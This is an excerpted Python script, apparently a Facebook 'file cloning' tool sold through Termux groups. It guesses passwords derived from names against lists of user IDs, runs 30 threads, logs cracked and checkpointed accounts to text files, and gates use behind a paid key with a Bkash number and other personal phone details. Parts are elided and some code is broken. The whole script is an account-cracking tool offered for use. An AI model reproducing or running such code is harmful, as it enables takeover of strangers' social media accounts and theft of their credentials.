...
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄samir᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄samir᭄
                           \x1b[1;92m╔═════════════════════════════╗
                           \x1b[1;92m║➣TOOL NAME : { FILE CLONING }   ║
                           \x1b[1;92m║➣AUTHOR    : kazi samir      ║
                           \x1b[1;92m║➣GITHUB    : git.me/kazisamir4  ║
                           \x1b[1;92m║➣FACEBOOK  : Fourkan Uddin Tanvir   ║
                           \x1b[1;92m║➣Group     : samir Termux command 2022 ║
                           \x1b[1;92m║➣WHATSAPP  : [ +8801840261060 ]       ║
                           \x1b[1;92m╚═════════════════════════════╝
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄samir᭄
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄samir᭄
"""                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mkazi samir_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mkazi samir_CP.txt' % (H, P, str(len(cp))))
...
def mr_kausar():
    ...
    print('')
    _samir1___ = input('\033[0;95m [?] CHOOSE OPTION : ')
    if _samir1___ in ('1', '01'):
        __xxx__().samir(id)
    if _samir1___ in ('2', '02'):
        os.system('python samir.py')
    if _samir1___ in ('3', '03'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r[➣]\x1b[1;92m[samir] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[samir-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('samir_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with kausarssb(max_workers=30) as ssbworld:
                for zsb in self.id: # kazi samir BANGLADESH HACKER
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\Bkash Account Number 01840261060\n')
        print('\Facebook Account Name ➣ FOURKAN UDDIN TANVIR\n')
        print
        print
...
def bnsreg():
    ...
    print ('\x1b[1;97m\tYour Key Is Not Approved\n')
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~ka.SAMIR=="
    print
    ...
    print
    print('\Bkash Account Number 01840261060\n')
    print('\rAccount Name ➣ FOURKAN UDDIN TANVIR\n')
    print
